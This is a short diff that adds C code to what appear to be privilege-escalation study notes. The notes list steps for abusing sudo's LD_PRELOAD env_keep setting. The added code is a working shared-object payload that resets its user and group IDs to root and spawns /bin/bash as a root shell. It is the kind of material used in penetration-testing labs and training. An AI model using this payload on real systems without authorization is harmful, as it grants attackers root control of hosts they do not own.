@@ -235,6 +235,17 @@ Summary:
 1. Check for LD_PRELOAD (with the env_keep option)  
 2. Write a simple C code compiled as a share object (.so extension) file  
 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file  
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
 
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
 
 
